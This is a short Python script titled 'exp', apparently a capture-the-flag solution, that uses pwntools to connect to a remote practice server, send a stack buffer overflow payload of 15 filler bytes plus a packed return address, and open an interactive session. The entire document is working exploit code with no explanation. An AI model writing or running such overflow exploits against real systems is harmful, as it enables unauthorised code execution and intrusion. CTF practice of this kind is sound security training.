# exp

```python
from pwn import *

context.os='linux'
context.arch='amd64'
context.log_level='debug'

p = remote('node4.buuoj.cn', 27629)
payload = b'a'*15 + p64(0x401186)
p.sendline(payload)
p.interactive()
```
